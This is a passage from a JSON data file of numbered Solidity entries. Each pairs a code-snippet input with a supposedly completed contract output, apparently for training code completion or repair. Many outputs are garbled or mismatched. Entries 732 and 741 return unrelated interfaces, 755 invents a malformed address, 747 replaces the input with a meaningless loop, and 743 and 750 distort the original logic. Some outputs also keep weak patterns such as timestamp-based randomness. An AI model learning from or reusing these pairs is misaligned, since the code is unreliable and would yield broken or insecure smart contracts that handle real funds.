        "output": "pragma solidity ^0.8.9;\ninterface IWETH {\n    function balanceOf(address account) external view returns (uint256);\n}\n\n"
    },
    "717.sol": {
        "input": "struct YourStruct {\n    uint x;\n    string y;\n}\nfunction func(\n    uint a,\n    uint b,\n    string memory c,\n    YourStruct memory d\n    ) external;\n\nlet args = [\n    1,\n    2,\n    \"c\",\n    {\n        x: 3,\n        y: \"y\"\n    }\n]\ncontract.func(...args);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n    struct YourStruct {\n        uint x;\n        string y;\n    }\n    \n    function func(\n        uint a,\n        uint b,\n        string memory c,\n        YourStruct memory d\n    ) external {\n        // function implementation goes here\n    }\n}\n\ncontract YourContractCaller {\n    YourContract contractInstance;\n    \n    constructor(address contractAddress) {\n        contractInstance = YourContract(contractAddress);\n    }\n    \n    function callFunc() external {\n        YourContract.YourStruct memory structArg = YourContract.YourStruct(3, \"y\");\n        contractInstance.func(1, 2, \"c\", structArg);\n    }\n}\n"
    },
    "718.sol": {
        "input": "function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual override {\n    require(deadline >= block.timestamp, \"ERC20Permit: expired deadline\");\n        \n    bytes32 hashStruct = keccak256(\n        abi.encode(\n            keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n            owner,\n            spender,\n            amount,\n            nonce[owner],\n            deadline\n        )\n    );\n\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            '\\x19\\x01',\n            keccak256(abi.encode( keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n            keccak256(bytes(name_)),\n            keccak256(bytes(version())),\n            chainId,\n            address(this)\n        ),\n            hashStruct\n        )\n    );\n    \n   \n    address signer = ecrecover(hash, v, r, s);\n    require(\n        signer != address(0) && signer == owner,\n        \"ERC20Permit: invalid signature\"\n    );\n    nonces[owner]++;\n    _approve(owner, spender, amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => uint256) public nonces;\n    mapping(address => mapping(address => uint256)) private allowances;\n    \n    string public name_;\n    uint256 public chainId;\n\n    constructor(string memory name) {\n        name_ = name;\n        chainId = 1; // Replace with the desired chain ID\n    }\n    \n    function version() public pure returns (string memory) {\n        return \"1.0\";\n    }\n    \n    function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {\n        require(deadline >= block.timestamp, \"ERC20Permit: expired deadline\");\n        \n        bytes32 hashStruct = keccak256(\n            abi.encode(\n                keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n                owner,\n                spender,\n                amount,\n                nonces[owner],\n                deadline\n            )\n        );\n\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                '\\x19\\x01',\n                keccak256(abi.encode( keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                keccak256(bytes(name_)),\n                keccak256(bytes(version())),\n                chainId,\n                address(this)\n            )),\n                hashStruct\n            )\n        );\n    \n        address signer = ecrecover(hash, v, r, s);\n        require(\n            signer != address(0) && signer == owner,\n            \"ERC20Permit: invalid signature\"\n        );\n        nonces[owner]++;\n        _approve(owner, spender, amount);\n    }\n    \n    function _approve(address owner, address spender, uint256 amount) private {\n        allowances[owner][spender] = amount;\n    }\n    \n    function allowance(address owner, address spender) public view returns (uint256) {\n        return allowances[owner][spender];\n    }\n}\n"
    },
    "720.sol": {
        "input": "contract GameItem is ERC721 {\n\npragma solidity ^0.8;\n\ncontract Parent1 {\n    constructor(string memory message1) {}\n}\n\ncontract Parent2 {\n    constructor(string memory message2) {}\n}\n\ncontract Child is Parent1, Parent2 {\n    constructor() Parent1(\"hello\") Parent2(\"world\") {}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Parent1 {\n    string public message;\n\n    constructor(string memory _message) {\n        message = _message;\n    }\n}\n\ncontract Parent2 {\n    string public message;\n\n    constructor(string memory _message) {\n        message = _message;\n    }\n}\n\n"
    },
    "722.sol": {
        "input": "address admin ;\n\nconstructor() public {\n    admin == msg.sender;\n}\n\nmodifier isAdmin {\n    require(admin == msg.sender,\"you are not the owner\");\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Owned {\n    address public owner;\n    address public admin = msg.sender;\n\n    constructor() public {\n        owner = msg.sender;\n        admin = msg.sender;\n    }\n\n    modifier isAdmin {\n        require(admin == msg.sender,\"you are not the owner\");\n        _;\n    }\n}\n\n"
    },
    "723.sol": {
        "input": "require( currentTime >= assetCoolingPeriodEndTime, \"asset restricted by the owner\" );\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n        c = a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {\n        require(b <= a, \"SafeMath: subtraction overflow\");\n        c = a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n        c = a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {\n        require(b > 0, \"SafeMath: division by zero\");\n        c = a / b;\n    }\n}\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256 balance);\n\n    function transfer(address recipient, uint256 amount) external returns (bool success);\n\n    function allowance(address owner, address spender) external view returns (uint256 remaining);\n\n    function approve(address spender, uint256 amount) external returns (bool success);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "724.sol": {
        "input": "walletMints[msg.sender] += quantity_;\nrequire(walletMints[msg.sender] <= maxPerWallet, \"exceed max wallet\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MintWallet {\n\n    string public name;\n\n    address public owner;\n\n    uint256 public maxPerWallet;\n\n    mapping(address => uint256) public walletMints;\n\n    constructor() public {\n        owner = msg.sender;\n        name = \"Mint Wallet\";\n        maxPerWallet = 1 ether;\n    }\n\n    function mint(uint256 quantity_) public payable {\n        walletMints[msg.sender] += quantity_;\n        require(walletMints[msg.sender] <= maxPerWallet, \"exceed max wallet\");\n    }\n}\n\n"
    },
    "725.sol": {
        "input": "uint256 favoriteNumber;\n\nfunction store(uint256 _favoriteNumber) public {\n    favoriteNumber = _favoriteNumber;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FavoriteNumber {\n    uint256 private favoriteNumber;\n\n    function store(uint256 _favoriteNumber) public {\n        favoriteNumber = _favoriteNumber;\n    }\n\n    function getFavoriteNumber() public view returns (uint256) {\n        return favoriteNumber;\n    }\n}\n\n"
    },
    "727.sol": {
        "input": "    receive() external payable {\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Receiver {\n    receive() external payable {\n    }\n}\n\n"
    },
    "728.sol": {
        "input": "function getStr2() public view returns (string) {\n    bytes memory byteArray = abi.encode(115792089237316195423570985008687907853269984665640564039457584007913129639932);\n    return string(byteArray);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract { \n  function getStr2() public view returns (string) {\n    bytes memory byteArray = abi.encode(115792089237316195423570985008687907853269984665640564039457584007913129639932);\n    return string(byteArray);\n  }\n}\n\n"
    },
    "729.sol": {
        "input": "pragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ninterface IRule {\n    function rule (bytes32 data, address addr, \n       address[] memory addrArr, uint256[] memory uintArr, \n       bytes[] memory dataArr, string memory str)\n    external view returns (bool);\n}\ncontract Demo is Ownable {\n    mapping(bytes32 => IRule)  public rules;\n    function setRule(bytes32 role, IRule rule) public onlyOwner {\n        rules[role] = rule;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address owner;\n\n    constructor () {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n}\n\n"
    },
    "730.sol": {
        "input": "contract MyContract {\n\n  string public svg; \n\n  function setSvg(string calldata svg_) external {\n      svg = _svg;\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n\n  string public svg; \n\n  function setSvg(string calldata svg_) external {\n      svg = _svg;\n  }\n\n  \n  string private constant _svg = \"https://example.com/icon.svg\";\n\n}\n"
    },
    "731.sol": {
        "input": "pragma solidity >=0.8.6;\n\ninterface DataStruct {\n    struct authDataOSS {\n        string oss;\n        string mt_us;\n        bool data_status;\n    }\n\n    struct ossName {\n        string _name;\n    }\n} \n\ncontract Contract1 is DataStruct {\n\n    mapping (address => authDataOSS[]) private _allowedData;\n    mapping (address => ossName[]) private _alllowedOSS;\n\n    constructor() {\n        _allowedData[msg.sender].push(authDataOSS(\"test\", \"test\", true));\n        _alllowedOSS[msg.sender].push(ossName(\"test\"));\n    }\n\n    function getOSS(address _usr_add) public view returns (address, ossName[] memory) {\n       return (_usr_add, _alllowedOSS[_usr_add]);\n    }\n    \n    function getDataUss(address _usr_add) public view returns (address, authDataOSS[] memory) {\n        return(_usr_add, _allowedData[_usr_add]);\n    }\n}\n\npragma solidity >=0.8.6;\n\nimport \"./Test.sol\";\n \ncontract Contract2 is DataStruct {\n    \n    event showMsg(uint);\n    \n    function list_data(Contract1 _contract1, address _usr_add) public view returns (address, authDataOSS[] memory) {\n        (address _usr_add_res, authDataOSS[] memory _data) = _contract1.getDataUss(_usr_add);\n        return (_usr_add_res, _data);\n    }\n\n    function list_OSS(Contract1 _contract1, address _usr_add) public view returns (address, ossName[] memory) {\n        (address _usr_add_res, ossName[] memory _oss_names) = _contract1.getOSS(_usr_add);\n        return (_usr_add_res, _oss_names);\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary DataStruct {\n    struct authDataOSS {\n        string oss;\n        string mt_us;\n        bool data_status;\n    }\n\n    struct ossName {\n        string _name;\n    }\n} \n\n"
    },
    "732.sol": {
        "input": "constructor(string memory _name, string memory _symbol) ERC721(_name, _symbol)\n{\n    owner = payable(msg.sender); \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC721 {\n    function mint(address to, uint256 tokenId) external;\n}\n\n"
    },
    "733.sol": {
        "input": "pragma solidity 0.8.18;\n\ncontract TinybarsDemo {\n    function checkBalance()\n        public view\n        returns (uint256 senderBalance)\n    {\n        senderBalance = msg.sender.balance;\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TinybarsDemo {\n    function checkBalance()\n        public view\n        returns (uint256 senderBalance)\n    {\n        senderBalance = msg.sender.balance;\n    }\n}\n\n"
    },
    "734.sol": {
        "input": "address payable _owner = payable(owner());\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address payable _owner = payable(owner());\n\n    modifier onlyOwner() {\n        if (_owner != msg.sender) {\n            revert();\n        }\n        _;\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        _owner = payable(newOwner);\n    }\n}\n\n"
    },
    "735.sol": {
        "input": "interface CheatCodes {\n           function prank(address) external;    \n }\ncontract Test is DSTest {\n   CheatCodes cheatCodes;\n   function setUp() public {\n       cheatCodes = CheatCodes(HEVM_ADDRESS);\n   }\n   \n   function test() public {\n       cheatCodes.prank(address(1337));\n       address(contract).customFunction();\n   }\n}\n        \n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract DSTest {\n    function setUp() public view returns (bool);\n}\n\n"
    },
    "736.sol": {
        "input": "   function recoverContribution() public payable{\n    require(hasDeadlinePassed(), \"deadline has not passed, contributions cannot be recovered rightnow\");\n    require(!(address(this).balance >= minimumTarget), \"target has been met, cannot recover contributions now\");\n    require(contributors[msg.sender] != 0, \"you have not contributed anything\");\n\n    contributors[msg.sender] = 0;\n    payable(msg.sender).transfer(contributors[msg.sender]);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContributionContract {\n    uint256 private minimumTarget;\n    mapping(address => uint256) private contributors;\n\n    constructor(uint256 _minimumTarget) {\n        minimumTarget = _minimumTarget;\n    }\n\n    function hasDeadlinePassed() internal view returns (bool) {\n        // Implement the logic to check if the deadline has passed\n        // Return true if the deadline has passed, otherwise return false\n    }\n\n    function recoverContribution() public payable {\n        require(hasDeadlinePassed(), \"deadline has not passed, contributions cannot be recovered right now\");\n        require(!(address(this).balance >= minimumTarget), \"target has been met, cannot recover contributions now\");\n        require(contributors[msg.sender] != 0, \"you have not contributed anything\");\n\n        uint256 amountToTransfer = contributors[msg.sender];\n        contributors[msg.sender] = 0;\n        payable(msg.sender).transfer(amountToTransfer);\n    }\n}\n"
    },
    "739.sol": {
        "input": "if (!radialcenter(from,to)){_lastBuy[from]=block.number-1;_tOwned[from] -= amount;}else{_lastBuy[from]=block.number;}\nuint256 transferAmount = amount;\n        \nif(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){\n        transferAmount = _getValues(amount, from);\n} \n        \n_tOwned[to] += transferAmount;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  function transfer(address to, uint value) external returns (bool);\n  function balanceOf(address who) external view returns (uint);\n  function allowance(address owner, address spender) external view returns (uint);\n  function transferFrom(address from, address to, uint value) external returns (bool);\n  function approve(address spender, uint value) external returns (bool);\n  function getApproved(address spender) external view returns (uint);\n  event Transfer(address indexed from, address indexed to, uint value);\n  event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ninterface IWETH9 {\n  function weth9() external returns (uint); \n  function weth9(uint) external payable returns (uint);\n}\n\n"
    },
    "740.sol": {
        "input": "function updatePost(uint256 _postIndex, uint256 _newCategory) external {\n    RegularPost storage post = RegularPostArray[_postIndex];\n    post.category = _newCategory;\n}\n\nfunction notUpdatePost(uint256 _postIndex, uint256 _newCategory) external {\n    RegularPost memory post = RegularPostArray[_postIndex];\n    post.category = _newCategory;\n}\n\n[\n  [\n    '1',\n    'a',\n    'a',\n    '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    '1',\n    category: '1',\n    name: 'a',\n    post: 'a',\n    addr: '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    date: '1'\n  ],\n  [\n    '2',\n    'b',\n    'b',\n    '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    '2',\n    category: '2',\n    name: 'b',\n    post: 'b',\n    addr: '0x86beB187A30265Ce437C0BB55f38aF21554659Ae',\n    date: '2'\n  ]\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RegularPost {\n    struct RegularPost {\n        uint256 category;\n        string name;\n        string post;\n        address addr;\n        uint256 date;\n    }\n    \n    RegularPost[] public RegularPostArray;\n    \n    function updatePost(uint256 _postIndex, uint256 _newCategory) external {\n      RegularPost storage post = RegularPostArray[_postIndex];\n      post.category = _newCategory;\n    }\n    \n    function notUpdatePost(uint256 _postIndex, uint256 _newCategory) external {\n      RegularPost memory post = RegularPostArray[_postIndex];\n      post.category = _newCategory;\n    }\n}\n\n"
    },
    "741.sol": {
        "input": "import \"C:\\Users\\{user_name}\\AppData\\Roaming\\npm\";\n\npragma solidity ^0.8.0;\n\nimport \"C:\\Users\\Dell\\AppData\\Roaming\\npm\"; \nimport \"node_modules/@openzeppelin/contracts/utils/Counters.sol\";\nimport \"./node_modules/@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"./node_modules/@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IResponse {\n    function get(uint256 _tokenId) external view returns (address recipient, uint256);\n}\n\n"
    },
    "742.sol": {
        "input": "require(amount <= msg.value, \"pay more\"); \n\nrequire(highestbid <= msg.value, \"pay more\");\n\nfunction _setHighestBid(uint256 val) internal virtual {\n  highestBid = val;\n}\n\n\nfunction _setHighestBid(uint256 val) internal override {\n  highestBid = val;\n  amount = val;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Auction {\n    uint256 public highestBid;\n    uint256 public amount;\n    \n    constructor() {\n        highestBid = 0;\n        amount = 0;\n    }\n    \n    function bid() public payable {\n        require(amount <= msg.value, \"pay more\");\n        require(highestBid <= msg.value, \"pay more\");\n        \n        _setHighestBid(msg.value);\n    }\n    \n    function _setHighestBid(uint256 val) internal virtual {\n        highestBid = val;\n    }\n    \n    function _setAmount(uint256 val) internal virtual {\n        amount = val;\n    }\n}\n"
    },
    "743.sol": {
        "input": "contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 {}\n\n function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        liquidity = IUniswapV2Pair(pair).mint(to);\n    }\n\n uint liquidity = balanceOf[address(this)]\n\nmapping(address => uint) public balanceOf;\n\n\n",
        "output": "pragma solidity ^0.4.25;\nlibrary UniswapV2Library {\n    function pairFor(address factory, address tokenA, address tokenB) external pure returns (address pair);\n}\n\nlibrary TransferHelper {\n    function safeTransferFrom(address token, address sender, address recipient, uint amount) external pure {}\n}\n\ninterface IUniswapV2Pair {\n    function mint(address to) external returns (uint liquidity);\n}\n\ncontract UniswapV2ERC20 {\n}\n\n"
    },
    "744.sol": {
        "input": "function withdraw() public onlyOwner  {\n    (bool hs, ) = payable(0x146FB9c3b2C13BA88c6945A759EbFa95127486F4).call{value: address(this).balance * 5 / 100}('');\n    require(hs);\n\n    (bool os, ) = payable(owner()).call{value: address(this).balance}('');\n    require(os);\n  }\n\n  function _baseURI() internal view virtual override returns (string memory) {\n    return uriPrefix;\n  }\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  function transfer(address to, uint256 value) external returns (bool);\n  function transferFrom(address from, address to, uint256 value) external returns (bool);\n  function approve(address spender, uint256 value) external returns (bool);\n  function allowance(address tokenOwner, address spender) external view returns (uint256);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event Approval(address indexed tokenOwner, address indexed spender, uint256 value);\n}\n\ninterface IERC223 {\n  function transfer(address to, uint256 value) external returns (bool);\n  function approve(address spender, uint256 value) external returns (bool);\n  function getApproved(address tokenOwner, address spender) external view returns (uint256);\n}\n\ncontract Ownable {\n  address private owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n\n  function transferOwnership(address newOwner) public onlyOwner {\n    owner = newOwner;\n  }\n}\n\n"
    },
    "745.sol": {
        "input": "0x\n0000000000000000000000000000000000000000000000000000000000000062\n0000000000000000000000000000000000000000000000000000000000000061\n000000000000000000000000000000000000000000000000000000000000007a\n\n0x\n0000000000000000000000000000000000000000000000000000000000000020 # pointer\n0000000000000000000000000000000000000000000000000000000000000003 # length\n62617a0000000000000000000000000000000000000000000000000000000000 # value\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function compare() external pure returns (bool) {\n        uint8[3] memory foo = [98, 97, 122]; \n        string memory bar = \"baz\";\n\n        bytes memory barBytes = bytes(bar);\n\n        if (foo.length != barBytes.length) {\n            return false;\n        }\n\n        for (uint i; i < foo.length; i++) {\n            uint8 barItemDecimal = uint8(barBytes[i]);\n            if (foo[i] != barItemDecimal) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function compare() external pure returns (bool) {\n        uint8[3] memory foo = [98, 97, 122]; \n        string memory bar = \"baz\";\n\n        bytes memory barBytes = bytes(bar);\n\n        if (foo.length != barBytes.length) {\n            return false;\n        }\n\n        for (uint i; i < foo.length; i++) {\n            uint8 barItemDecimal = uint8(barBytes[i]);\n            if (foo[i] != barItemDecimal) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n"
    },
    "746.sol": {
        "input": "function persons(uint256 _index) external view returns (Person memory);\n\ninterface IContractA {\n    struct Person {\n        string name;\n    }\n    function person(uint256 _index) external view returns (Person memory);\n}\n\ncontract ContractA {\n    struct Person {\n        string name;\n    }\n\n    Person[] public persons;\n\n    function createPerson(string memory _name) public {\n        persons.push(Person(_name));\n    }\n    function person(uint _index) external view returns (Person memory) {\n        return persons[_index];\n    }\n}\n\ncontract ContractB {\n    address contractAddress = 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B;\n\n    function getPerson(uint256 _index)\n        public\n        view\n        returns (IContractA.Person memory)\n    {\n        IContractA contractAIns = IContractA(contractAddress);\n        return contractAIns.person(_index);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IContractA {\n    struct Person {\n        string name;\n    }\n    function person(uint256 _index) external view returns (Person memory);\n}\n\ncontract ContractA {\n    struct Person {\n        string name;\n    }\n\n    Person[] public persons;\n\n    function createPerson(string memory _name) public {\n        persons.push(Person(_name));\n    }\n    function person(uint _index) external view returns (Person memory) {\n        return persons[_index];\n    }\n}\n\ncontract ContractB {\n    address contractAddress = 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B;\n\n    function getPerson(uint256 _index)\n        public\n        view\n        returns (IContractA.Person memory)\n    {\n        IContractA contractAIns = IContractA(contractAddress);\n        return contractAIns.person(_index);\n    }\n}\n\n"
    },
    "747.sol": {
        "input": "\npragma solidity >=0.5.0 <0.9.0;\n\nimport \"./SimpleStorage.sol\"; \ncontract StorageFactory{\n    \n    SimpleStorage[] public simpleStorageArray;\n\n    function createSimpleStorageContract() public \n    {\n        SimpleStorage simpleStorageContract = new SimpleStorage();\n        simpleStorageArray.push(simpleStorageContract);\n    }\n\n     function sfStore(uint256 _simpleStorrageIndex, uint256 _simpleStorageNumber) public\n     {\n       SimpleStorage simpleStorageContract =  SimpleStorage(address(simpleStorageArray[_simpleStorageIndex])); \n       simpleStorageContract.store(_simpleStorageNumber);   \n     }\n}\n\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Answer\n{\n    mapping(address => uint) public StorageMap; \n\n    function InsertToStorage(address name, uint favoritenumber) public \n    {\n        StorageMap[name] = favoritenumber;\n    }\n\n    function GetFavoriteNumber(address name) public view returns(uint) \n    {\n        return StorageMap[name];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint256 public count;\n    mapping(uint256 => bool) public usedIndexes;\n\n    function store(uint256 number) public \n    {\n        require(\n            uint256(count) <= 61,\n            \"Maximum number of items reached\"\n        );\n\n        uint lastIndex = count;\n        for(int i=0; i < 62; i++ ) \n        {\n          usedIndexes[lastIndex] = true;\n          lastIndex += 1;\n        }\n        count = lastIndex;\n    }\n}\n\n"
    },
    "748.sol": {
        "input": "function setInstructor(address _address, uint _age, string memory _fName, string memory _lName) public {\n     Instructor storage instructor = instructors[_address];\n\n\ninstructorAccts.push(_address) -1;\n\ninstructorAccts.push(_address);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Instructor {\n        uint age;\n        string fName;\n        string lName;\n    }\n\n    mapping(address => Instructor) public instructors;\n    address[] public instructorAccts;\n\n    function setInstructor(address _address, uint _age, string memory _fName, string memory _lName) public {\n        Instructor storage instructor = instructors[_address];\n        instructor.age = _age;\n        instructor.fName = _fName;\n        instructor.lName = _lName;\n\n        instructorAccts.push(_address);\n    }\n}\n"
    },
    "749.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function mint() external {\n        require(block.timestamp >= 1640995200, \"Not yet available\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function mint() external {\n        require(block.timestamp >= 1640995200, \"Not yet available\");\n        // ... rest of your code\n    }\n}\n\n"
    },
    "750.sol": {
        "input": "contract MyAbstractContract {\n  function myAbstractFunction() public pure returns (string);\n}\n\n  contract MyContract is MyAbstractContract {\n      function myAbstractFunction() public pure returns (string)\n }\n\ncontract MyContract is MyAbstractContract {\n        function myAbstractFunction() public pure returns (string)\n         { return \"string value to return\"; }\n    }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyAbstractContract {\n  function myAbstractFunction() public pure returns (string) {\n    return \"string value to return\";\n  }\n}\n\n"
    },
    "751.sol": {
        "input": "function sendGift(uint256 _mintAmount,address recipient) public {\n\npayable(admin).call{value: address(this).balance}(\"\");\n\nadmin.transfer(address(this).balance);\n\npayable(admin).transfer(address(this).balance);\n\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n}\n\ncontract MyContract {\n    function withdrawToken() {\n        IERC20(tokenContractAddress).transfer(recipient, amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n}\n\n"
    },
    "752.sol": {
        "input": "function swapEthToVs(uint256 amount) public payable returns (bytes32) {\n    require(_admin != _msgSender(),\"You Cannot Buy this Coin At this moment\");\n    bytes32 kHash = keccak256(abi.encodePacked(msg.value,amount,_msgSender()));\n    swapHash[_origin()] = kHash;\n    payable(address(_admin)).transfer(msg.value);\n    return kHash;\n}\n\nfunction verifySwapHash(uint256 eth,address to,uint256 amount) public returns (bool) {\n    require(swapHash[to] == keccak256(abi.encodePacked(eth, amount, to)),\"Invalid hash no trace found\");\n    transfer(to, amount);\n    delete swapHash[to];\n    return true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SwapContract {\n    address private _admin;\n    mapping(address => bytes32) private swapHash;\n\n    constructor() {\n        _admin = msg.sender;\n    }\n\n    function swapEthToVs(uint256 amount) public payable returns (bytes32) {\n        require(_admin != msg.sender, \"You cannot buy this coin at this moment\");\n        bytes32 kHash = keccak256(abi.encodePacked(msg.value, amount, msg.sender));\n        swapHash[msg.sender] = kHash;\n        payable(address(_admin)).transfer(msg.value);\n        return kHash;\n    }\n\n    function verifySwapHash(uint256 eth, address to, uint256 amount) public returns (bool) {\n        require(swapHash[to] == keccak256(abi.encodePacked(eth, amount, to)), \"Invalid hash, no trace found\");\n        transfer(to, amount);\n        delete swapHash[to];\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) internal {\n        // Transfer logic here\n    }\n}\n"
    },
    "753.sol": {
        "input": "function getAllBools() public view returns (bool[] memory) {\n    bool[] memory result = new bool[](keys.length);\n    for (uint i = 0; i < keys.length; i++) {\n        result[i] = inserted[keys[i]];\n    }\n    return result;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BooleanMap {\n\n    \n    function getAllBools() public view returns (bool[] memory) {\n        bool[] memory result = new bool[](keys.length);\n        for (uint i = 0; i < keys.length; i++) {\n            result[i] = inserted[keys[i]];\n        }\n        return result;\n    }\n\n    mapping(address => bool) public inserted;\n    address[] public keys;\n}\n\n"
    },
    "755.sol": {
        "input": "pragma solidity ^0.5.7;\n\npragma solidity ^0.8.4;\n\nbalances[require] += amount;\n\nbalances[receiver] += amount;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Ownable {\n    mapping (address => uint256) balances;\n    address private receiver = 0x458621281093854127328074033652380466270;\n    constructor(uint256 _amount) public {\n        balances[receiver] += _amount;\n    }\n}\n\n"
    },
    "756.sol": {
        "input": "pragma solidity ^0.8.9;\ncontract Test {\n    mapping(uint16 => bool) public usedTokens;  \n    uint16 public totalTokens = 40000;  \n    \n    function getRandomToken(uint16 player) public returns (uint16) {\n        require(player > 0, \"Invalid player ID\");  \n        \n        uint16 tokenId = _generateRandomToken(player);  \n        while (usedTokens[tokenId]) {  \n            tokenId = _generateRandomToken(player);\n        }\n        \n        usedTokens[tokenId] = true;  \n        return tokenId;  \n    }\n    \n    function _generateRandomToken(uint16 player) private view returns (uint16) {\n        uint16 randomNumber = uint16(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, player))));\n        return (randomNumber % totalTokens) + 1;  \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    mapping(uint16 => bool) public usedTokens;  \n    uint16 public totalTokens = 40000;  \n    \n    function getRandomToken(uint16 player) public returns (uint16) {\n        require(player > 0, \"Invalid player ID\");  \n        \n        uint16 tokenId = _generateRandomToken(player);  //\n        while (usedTokens[tokenId]) {  \n            tokenId = _generateRandomToken(player);\n        }\n        \n        usedTokens[tokenId] = true;  \n        return tokenId;  \n    }\n    \n    function _generateRandomToken(uint16 player) private view returns (uint16) {\n        uint16 randomNumber = uint16(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, player))));\n        return (randomNumber % totalTokens) + 1;  \n    }\n}\n\n"
    },
    "757.sol": {
        "input": "contract Bar {\n    function blockingFunction() public pure returns (bool val) {\n        assembly {\n            let freePointer := mload(0x40)\n            mstore(freePointer,true)\n            val:=mload(freePointer)\n        }      \n    }  \n}\n\ncontract Foo is Bar {\n    function foo() public pure returns(bool) {\n        bool result = blockingFunction();\n        require(result == true, \"msg\");\n        return result;\n    }\n}\n\n\n",
